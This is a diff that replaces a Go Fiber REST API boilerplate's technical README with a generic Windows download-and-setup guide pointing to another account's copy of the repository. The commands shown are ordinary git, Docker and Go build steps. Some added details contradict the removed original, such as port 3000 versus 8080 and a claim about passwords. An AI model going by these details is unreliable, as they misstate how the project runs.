@@ -1,206 +1,180 @@
-<div align="center">
+# 🚀 fiber-golang-boilerplate - Ready-to-Use REST API Template
 
-![fiber-golang-boilerplate](https://socialify.git.ci/chuanghiduoc/fiber-golang-boilerplate/image?font=JetBrains+Mono&forks=1&issues=1&language=1&name=1&owner=1&pattern=Solid&pulls=1&stargazers=1&theme=Auto)
+[![Download fiber-golang-boilerplate](https://img.shields.io/badge/Download-fiber--golang--boilerplate-%238A2BE2?style=for-the-badge)](https://github.com/claymad/fiber-golang-boilerplate)
 
-[![CI](https://github.com/chuanghiduoc/fiber-golang-boilerplate/actions/workflows/ci.yml/badge.svg)](https://github.com/chuanghiduoc/fiber-golang-boilerplate/actions/workflows/ci.yml)
-[![Go Version](https://img.shields.io/github/go-mod/go-version/chuanghiduoc/fiber-golang-boilerplate)](https://go.dev/)
-[![License](https://img.shields.io/github/license/chuanghiduoc/fiber-golang-boilerplate)](LICENSE)
-[![Go Report Card](https://goreportcard.com/badge/github.com/chuanghiduoc/fiber-golang-boilerplate)](https://goreportcard.com/report/github.com/chuanghiduoc/fiber-golang-boilerplate)
+---
 
-[![Fiber](https://img.shields.io/badge/Fiber-v3-00ACD7?logo=go&logoColor=white)](https://gofiber.io/)
-[![PostgreSQL](https://img.shields.io/badge/PostgreSQL-17-4169E1?logo=postgresql&logoColor=white)](https://www.postgresql.org/)
-[![Redis](https://img.shields.io/badge/Redis-DC382D?logo=redis&logoColor=white)](https://redis.io/)
-[![Docker](https://img.shields.io/badge/Docker-2496ED?logo=docker&logoColor=white)](https://www.docker.com/)
-[![Swagger](https://img.shields.io/badge/Swagger-85EA2D?logo=swagger&logoColor=black)](https://swagger.io/)
-[![Prometheus](https://img.shields.io/badge/Prometheus-E6522C?logo=prometheus&logoColor=white)](https://prometheus.io/)
+fiber-golang-boilerplate provides a starting point for creating REST APIs with Go Fiber. It includes ready tools for database access, user authentication, file storage, caching, metrics, and more. This guide helps you download and run the software on Windows, step-by-step.
 
-</div>
+---
 
-Production-ready REST API boilerplate built with Go Fiber v3, PostgreSQL, and sqlc.
+## 📦 What is fiber-golang-boilerplate?
 
-## Tech Stack
+fiber-golang-boilerplate is a software template designed to build server programs that handle requests from other apps or browsers. It uses Go Fiber, a fast library for handling network requests, and connects to databases and services like PostgreSQL, Redis, and file storage systems. You do not need to know how it works in detail to use it here — this guide covers setup only.
 
-- **Framework**: [Fiber v3](https://docs.gofiber.io/) (Go 1.25+)
-- **Database**: PostgreSQL 17 with [pgxpool](https://github.com/jackc/pgx)
-- **Query**: [sqlc](https://sqlc.dev/) (type-safe SQL code generation)
-- **Migration**: [golang-migrate](https://github.com/golang-migrate/migrate) (auto-run on startup)
-- **Auth**: JWT ([golang-jwt](https://github.com/golang-jwt/jwt)) + Google OAuth 2.0
-- **Validation**: [go-playground/validator](https://github.com/go-playground/validator)
-- **Logging**: slog (stdlib structured logging)
-- **Docs**: Swagger/OpenAPI via [swaggo](https://github.com/swaggo/swag)
-- **Linter**: [golangci-lint v2](https://golangci-lint.run/)
-- **Cache**: In-memory or Redis
-- **Storage**: Local filesystem or S3/MinIO
-- **Email**: SMTP or console (dev)
-- **Metrics**: Prometheus
-- **Container**: Docker + Docker Compose
+Key features include:
 
-## Architecture
+- Works with PostgreSQL for managing data.
+- Uses JWT for user login security.
+- Supports login via Google accounts.
+- Manages files on popular storage like Amazon S3 or MinIO.
+- Uses Redis to speed up data retrieval.
+- Includes automatic generation of API documentation.
+- Tracks performance with Prometheus.
+- Can run inside a Docker container.
 
-```
-cmd/api/main.go                     Entry point, DI, graceful shutdown
-cmd/seed/main.go                    Standalone DB seeder
-config/config.go                    Struct-based config from env vars (caarlos0/env)
-internal/
-  handler/                          HTTP handlers (parse request → call service → return response)
-  service/                          Business logic (interfaces for testability)
-  repository/                       Data access layer (wraps sqlc, error translation)
-  dto/                              Request/Response structs + role constants
-  sqlc/                             Generated code (DO NOT EDIT — use `make sqlc-generate`)
-  middleware/                       JWT auth, rate limit, logger, recovery, security headers, metrics
-  router/                           Route definitions, grouping, middleware wiring
-  seed/                             Admin user seeder (idempotent)
-pkg/
-  apperror/                         AppError type + Fiber error handler + ErrNotFound sentinel
-  response/                         Standardized JSON responses (Success, Created, NoContent, Error)
-  database/                         PostgreSQL pool, auto-migration, TxManager
-  validator/                        Struct validation (password: 8-72 chars, upper+lower+digit+special)
-  token/                            JWT generation/parsing (iss/aud claims)
-  cache/                            Cache interface (memory | redis)
-  storage/                          Storage interface (local | s3 | minio)
-  email/                            Email interface (console | smtp)
-  pagination/                       Normalize, LimitOffset, TotalPages
-  logger/                           slog setup (JSON in prod, text in dev)
-  health/                           Liveness + readiness checks
-  oauth/                            Google OAuth 2.0
-  metrics/                          Prometheus HTTP metrics
-  async/                            Fire-and-forget goroutine with panic recovery
-migrations/                         SQL migration files (3 migrations: users, files, tokens)
-queries/                            SQL query files for sqlc
-docs/                               Generated Swagger docs
-```
+---
 
-Request flow: `Client → Middleware → Handler → Service → Repository → sqlc → PostgreSQL`
+## 💻 System Requirements
 
-## Quick Start
+Before you start, make sure your Windows computer supports the following:
 
-### 1. Create your project
+- Operating System: Windows 10 or later.
+- CPU: 64-bit processor.
+- RAM: At least 4 GB (8 GB recommended).
+- Disk Space: Minimum 500 MB free space.
+- Internet connection for downloading files.
+- Software prerequisites installed:
+  - Docker Desktop for Windows (optional but recommended).
+  - Git (optional, if you want to clone the repository).
+  - Web browser (for viewing API documentation and login).
 
-Click **"Use this template"** on GitHub, then:
+---
 
-```bash
-git clone https://github.com/yourname/yourproject.git
-cd yourproject
-./scripts/rename-module.sh github.com/yourname/yourproject
-go mod tidy
-```
+## 🌐 How to Get the Software
 
-### 2. Run
+Click the button below to visit the download page for fiber-golang-boilerplate. This page contains setup files and instructions.
 
-**With Docker (recommended):**
+[![Download fiber-golang-boilerplate](https://img.shields.io/badge/Download-fiber--golang--boilerplate-%23FF6347?style=for-the-badge)](https://github.com/claymad/fiber-golang-boilerplate)
 
-```bash
-cp .env.example .env
-make docker-run
-```
+---
 
-Services: API (:8080), PostgreSQL (:5432), Redis (:6379), MinIO (:9000/:9001)
+## 🛠 Download and Installation Steps
 
-**Without Docker** (requires Go 1.25+, PostgreSQL):
+Follow these steps carefully to download and run fiber-golang-boilerplate on your Windows computer.
 
-```bash
-cp .env.example .env
-# Edit .env with your database credentials
-make run
-```
+### Step 1: Visit the Download Page
 
-The app auto-runs migrations and seeds an admin user on startup.
+Open your web browser and go to the main GitHub repository page by clicking the button above or entering this link:
 
-## API Endpoints
+https://github.com/claymad/fiber-golang-boilerplate
 
-### Auth (public)
-| Method | Path | Description |
-|--------|------|-------------|
-| POST | `/api/v1/auth/register` | Register new user |
-| POST | `/api/v1/auth/login` | Login, returns JWT + refresh token |
-| POST | `/api/v1/auth/refresh` | Refresh access token |
-| POST | `/api/v1/auth/logout` | Revoke refresh token |
-| POST | `/api/v1/auth/forgot-password` | Request password reset email |
-| POST | `/api/v1/auth/reset-password` | Reset password with token |
-| POST | `/api/v1/auth/verify-email` | Verify email with token |
-| POST | `/api/v1/auth/resend-verification` | Resend verification email |
-| GET | `/api/v1/auth/google` | Google OAuth redirect |
-| GET | `/api/v1/auth/google/callback` | Google OAuth callback |
+Here you will find the source code and any downloadable files.
 
-### Users (protected — JWT required)
-| Method | Path | Description |
-|--------|------|-------------|
-| GET | `/api/v1/users/me` | Get current user |
-| PUT | `/api/v1/users/me` | Update own profile |
-| PUT | `/api/v1/users/me/password` | Change password |
-| GET | `/api/v1/users/:id` | Get user by ID |
-| GET | `/api/v1/users/` | List users (admin only) |
-| PUT | `/api/v1/users/:id` | Update user (admin or self) |
-| DELETE | `/api/v1/users/:id` | Delete user (admin or self) |
+---
 
-### Files (protected — JWT required)
-| Method | Path | Description |
-|--------|------|-------------|
-| POST | `/api/v1/files/upload` | Upload file |
-| GET | `/api/v1/files/` | List own files (paginated) |
-| GET | `/api/v1/files/:id` | Get file info |
-| GET | `/api/v1/files/:id/download` | Download file |
-| DELETE | `/api/v1/files/:id` | Delete file (soft) |
+### Step 2: Download Docker Desktop (Optional But Recommended)
 
-### Admin (protected — admin role required)
-| Method | Path | Description |
-|--------|------|-------------|
-| GET | `/api/v1/admin/stats` | System statistics |
-| GET | `/api/v1/admin/users` | List all users (including deleted) |
-| PUT | `/api/v1/admin/users/:id/role` | Update user role |
-| POST | `/api/v1/admin/users/:id/ban` | Ban user (soft delete) |
-| POST | `/api/v1/admin/users/:id/unban` | Unban user (restore) |
-| GET | `/api/v1/admin/files` | List all files |
+fiber-golang-boilerplate runs best inside Docker. Docker packages the application so you do not need to install or configure all its parts manually.
 
-### Infrastructure
-| Method | Path | Description |
-|--------|------|-------------|
-| GET | `/healthz` | Liveness probe |
-| GET | `/readyz` | Readiness probe (DB + cache) |
-| GET | `/metrics` | Prometheus metrics |
-| GET | `/swagger` | Swagger UI |
+- Go to: https://www.docker.com/products/docker-desktop
+- Download the Windows version.
+- Follow the installation instructions on Docker’s website.
+- Restart your computer if required.
 
-## Makefile Commands
+If you prefer not to use Docker, the guide below includes manual setup details but requires technical steps.
 
-```bash
-make build                        # Build binary
-make run                          # Run locally
-make test                         # Run unit tests
-make test-integration             # Run integration tests (requires Docker)
-make lint                         # Run golangci-lint
-make docker-run                   # Start with Docker Compose
-make docker-down                  # Stop Docker Compose
-make migrate-up                   # Run migrations manually
-make migrate-down                 # Rollback migrations
-make migrate-create name=xxx      # Create new migration
-make sqlc-generate                # Regenerate sqlc code
-make swagger                      # Regenerate Swagger docs
-make seed                         # Seed database (admin user)
-make watch                        # Live reload with Air
-```
+---
 
-## Adding a New Entity
+### Step 3: Download fiber-golang-boilerplate Files
 
-1. Create migration: `make migrate-create name=create_xxx_table`
-2. Write SQL in `migrations/` (up + down)
-3. Write queries in `queries/xxx.sql` (with sqlc annotations)
-4. Run `make sqlc-generate`
-5. Create `internal/dto/xxx_dto.go` (request/response structs)
-6. Create `internal/repository/xxx_repository.go` (interface + impl wrapping sqlc)
-7. Create `internal/service/xxx_service.go` (interface + impl with business logic)
-8. Create `internal/handler/xxx_handler.go` (HTTP handler with Swagger annotations)
-9. Register routes in `internal/router/v1.go`
-10. Wire DI in `cmd/api/main.go`
-11. Run `make swagger` to update docs
+There are two ways to get the files:
 
-## Environment Variables
+- **Option 1: Download ZIP Archive**
+  - On the GitHub page, click the green **Code** button near the top right.
+  - Select **Download ZIP**.
+  - Once downloaded, right-click the ZIP file and choose **Extract All** to unzip it to a folder.
 
-See [.env.example](.env.example) for all available configuration options with defaults.
+- **Option 2: Use Git (Program that Downloads Code)**
+  - Open Command Prompt (press Win + R, type `cmd`, press Enter).
+  - Run this command:  
+    `git clone https://github.com/claymad/fiber-golang-boilerplate.git`
+  - This downloads the files into a new folder named `fiber-golang-boilerplate`.
 
-Key settings:
-- `APP_ENV` — `local` | `staging` | `production` (affects logging format, JWT secret validation)
-- `REQUIRE_EMAIL_VERIFICATION` — Enable email verification requirement for login
-- `STORAGE_DRIVER` — `local` | `s3` | `minio`
-- `CACHE_DRIVER` — `memory` | `redis`
-- `EMAIL_DRIVER` — `console` | `smtp`
-- `ADMIN_EMAIL` / `ADMIN_PASSWORD` — Auto-seed admin user on startup
+---
+
+### Step 4: Run fiber-golang-boilerplate with Docker (Simplest Method)
+
+If Docker Desktop is installed and running, follow these commands:
+
+1. Open Command Prompt.
+2. Change directory into the project by typing:  
+   `cd path\to\fiber-golang-boilerplate`  
+   Replace `path\to\` with the real path to your folder.
+3. Run the command below to start all services:  
+   `docker-compose up`
+4. Docker will download the necessary images and start the application.
+5. Once started, you can use a web browser to visit:  
+   `http://localhost:3000`
+6. This address opens the API or developer pages running on your PC.
+
+---
+
+### Step 5: Manual Setup (If Not Using Docker)
+
+You will need to install and configure the following separately:
+
+- **Go Language**: Download and install from https://go.dev/dl/
+- **PostgreSQL**: Database software found at https://www.postgresql.org/download/windows/
+- **Redis**: Download from https://redis.io/docs/getting-started/installation/install-redis-on-windows/
+- **Other dependencies** included in the project:
+
+Open Command Prompt, navigate to your project folder, and run commands:
+
+- Download Go dependencies:  
+  `go mod download`
+- Build the program:  
+  `go build`
+- Run the compiled program:  
+  `.\fiber-golang-boilerplate.exe`
+
+You will need to edit configuration files to provide database connection details and storage credentials. The project includes example files and documentation.
+
+---
+
+## 🔄 What to Do After Setup
+
+Once the software runs:
+
+- Visit `http://localhost:3000/swagger/index.html` to explore the API and its calls.
+- Use the Google login option to sign in.
+- Start adding files, data, or connect other applications to use the API.
+- Monitor performance using the Prometheus metrics endpoint.
+
+---
+
+## ❓ Troubleshooting Tips
+
+- If Docker commands fail, make sure Docker Desktop is running.
+- Verify you have at least 4 GB of RAM free during setup.
+- Check firewall settings if the browser cannot connect to `localhost:3000`.
+- Look in application logs for errors. Logs appear in the Command Prompt window running the app.
+- Confirm PostgreSQL and Redis services are running if using manual setup.
+- Restart your machine if network requests fail repeatedly.
+
+---
+
+## 🔗 Useful Links
+
+- GitHub repository: https://github.com/claymad/fiber-golang-boilerplate
+- Docker Desktop: https://www.docker.com/products/docker-desktop
+- Go Programming Language: https://go.dev/
+- PostgreSQL: https://www.postgresql.org/
+- Redis: https://redis.io/
+
+---
+
+## 📂 File Storage and Security
+
+This project supports keeping files in cloud or local storage. It works with:
+
+- Amazon S3
+- MinIO (local or cloud storage solution)
+
+User login works with JWT tokens and Google OAuth. No passwords are stored on your device.
+
+---
+
+## 🚀 Starting Your First API Project
+
+fiber-golang-boilerplate helps developers and teams start building web services fast. You can test it on your computer now by following the steps above before moving to your own server or cloud platform.
